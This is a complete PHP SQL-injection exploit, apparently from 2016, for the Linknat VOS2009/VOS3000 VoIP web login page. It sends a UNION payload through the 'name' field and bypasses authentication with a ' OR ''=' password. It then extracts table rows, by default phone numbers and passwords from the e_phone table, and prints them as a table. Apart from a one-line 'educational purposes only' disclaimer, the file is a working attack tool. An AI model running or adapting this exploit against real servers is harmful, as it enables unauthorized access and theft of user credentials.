<?php
#
# Linknat VOS2009/VOS3000 SQLi exploit
#
# DISCLAIMER: The exploit is to be used for educational purposes only
#             The author would not be responsible for any misuse
#
# AUTHOR:     Osama Khalid
# WEBSITE:    http://www.codinghazard.com/
# DATE:       19/05/2016
# REF:        http://www.wooyun.org/bugs/wooyun-2010-0145458

if ($argc < 2) {
    banner();
    usage();
    exit;
}

$host         = $argv[1];
$column_one   = isset($argv[2]) ? $argv[2] : "e164";
$column_two   = isset($argv[3]) ? $argv[3] : "password";
$table        = isset($argv[4]) ? $argv[4] : "e_phone";
$other        = isset($argv[5]) ? $argv[5] : "";

function banner() {
    echo "########################################\n";
    echo "#                                      #\n";
    echo "# Linknat VOS3000/VOS2009 SQLi exploit #\n";
    echo "#                                      #\n";
    echo "#             sam fas                  #\n";
    echo "########### codinghazard.com ###########\n";
}

function usage() {
    echo "\n";
    echo "php vos3000.php [HOST]\n";
    echo "php vos3000.php 127.0.0.1\n";
    echo "php vos3000.php [HOST] [COL1] [COL2] [TABLE] [OTHER SQL]\n";
    echo "php vos3000.php 127.0.0.1 table_schema table_name
information_schema.tables \"where table_schema = 'mysql'\"
\n";
}

function curl($url, $post = array(), $cookies = null, $header = false) {
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($curl, CURLOPT_HEADER, $header);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    if ($cookies != null)
        curl_setopt($curl, CURLOPT_COOKIE, $cookies);
    if (count($post) > 0) {
        foreach ( $post as $key => $value)
            $post_items[] = $key . '=' . urlencode($value);
        $post_string = implode('&', $post_items);
        curl_setopt($curl, CURLOPT_POST, 1);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $post_string);
    }
    $data = curl_exec($curl);
    curl_close($curl);
    return $data;
}

function query($host, $query) {
    $data = curl("http://$host/eng/login.jsp", array(
            "loginType" => 1,
            "name" => "' union " . $query . "#",
            "pass" => "' OR ''='"
        ), null, true);
    preg_match_all('|Set-Cookie: (.*);|U', $data, $matches);
    $cookies = implode('; ', $matches[1]);
    $data = curl("http://$host/eng/welcome.jsp", array(), $cookies, false);
    $parts = explode("|", trim($data));

    if (count($parts) < 7)
        return false;

    return array($parts[3], $parts[4]);
}

function ascii_table($data) {
    $keys = array_keys(end($data));
    $wid = array_map('strlen', $keys);
    foreach($data as $row) {
        foreach(array_values($row) as $k => $v)
            $wid[$k] = max($wid[$k], strlen($v));
    }
    foreach($wid as $k => $v) {
        $fmt[$k] = "%-{$v}s";
        $sep[$k] = str_repeat('-', $v);
    }
    $fmt = '| ' . implode(' | ', $fmt) . ' |';
    $sep = '+-' . implode('-+-', $sep) . '-+';
    $buf = array($sep, vsprintf($fmt, $keys), $sep);
    foreach($data as $row) {
        $buf[] = vsprintf($fmt, $row);
        $buf[] = $sep;
    }
    return implode("\n", $buf);
}

banner();
echo "\n";
echo "Target:    $host\n";
echo "Column #1: $column_one\n";
echo "Column #2: $column_two\n";
echo "Table:     $table\n";
echo "Other:     $other\n";
echo "\n";

$results = array();
$count_result = query($host, "SELECT 1,2,COUNT(*),4,5,6 FROM $table
$other");
if ($count_result) {
    $count = intval($count_result[0]);
    echo "Found $count rows...\n";

    for ($i=0; $i<$count; $i++) {
        $q = "SELECT 1,2,HEX($column_one),HEX($column_two),5,6 FROM $table
$other LIMIT " . $i . ",1";
        $result = query($host, $q);
        if ($result) {
            echo "R" . ($i+1) . "]\t" . $column_one . " = "
.hex2bin($result[0]) . ", " . $column_two . " = " . hex2bin($result[1]) .
"\n";
        } else {
            echo "Error retrieving row " . ($i+1) . "\n";
        }
        $results[] = array($column_one => hex2bin($result[0]), $column_two
=> hex2bin($result[1]));
    }

    if (count($results) > 0) {
        echo "\n\n" . ascii_table($results) . "\n";
    }
} else {
    echo "Error retrieving row count";
}

?>

-- Osama Khalid
